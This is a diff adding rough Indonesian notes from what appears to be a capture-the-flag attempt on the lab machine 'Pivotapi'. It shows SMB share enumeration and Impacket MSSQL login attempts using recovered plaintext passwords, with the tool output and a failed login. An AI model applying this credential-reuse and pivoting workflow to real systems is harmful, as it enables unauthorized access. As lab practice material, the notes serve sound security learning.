@@ -1,0 +1,34 @@
+poc=
+====
+
+Open file: capture.apmx64
+https://www.file-extensions.org/api-monitor-file-extensions
+=====================================================
+
+SAMBA:
+
+Masuk ke kaorz dengan smb-client.py (password Roper4155), cari share NETLOGON dan SYSVOL, cek NETLOGON dan ada folder HelpDesk yang memiliki file biner dan 2 .msg:
+
+# ls
+drw-rw-rw-          0  Sun Aug  9 11:40:36 2020 .
+drw-rw-rw-          0  Sun Aug  9 11:40:36 2020 ..
+-rw-rw-rw-    1854976  Fri Feb 19 06:33:15 2021 Restart-OracleService.exe
+-rw-rw-rw-      24576  Sun Aug  9 11:40:36 2020 Server MSSQL.msg
+-rw-rw-rw-      26112  Sun Aug  9 07:45:39 2020 WinRM Service.msg
+
+
+# python3 mssqlclient.py -port 1433 PIVOTAPI/sa@10.10.10.240 -windows-auth             
+
+Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation
+
+Password: #mssql_s3rV1c3!2020
+[*]Encryption required, switching to TLS
+[-] ERROR(PIVOTAPI\SQLEXPRESS): Line 1: Error de inicio de sesión. El inicio de sesión se realiza desde un dominio que no es de confianza y no se puede utilizar con autenticación integrada.
+                                                                                               
+┌──(root💀kali)-[~/impacket/examples]
+└─# 
+
+atau 
+=========================================================================
+https://raw.githubusercontent.com/fredriclesomar/htb/master/Pivotapi/upload_git.txt
+=========================================================================
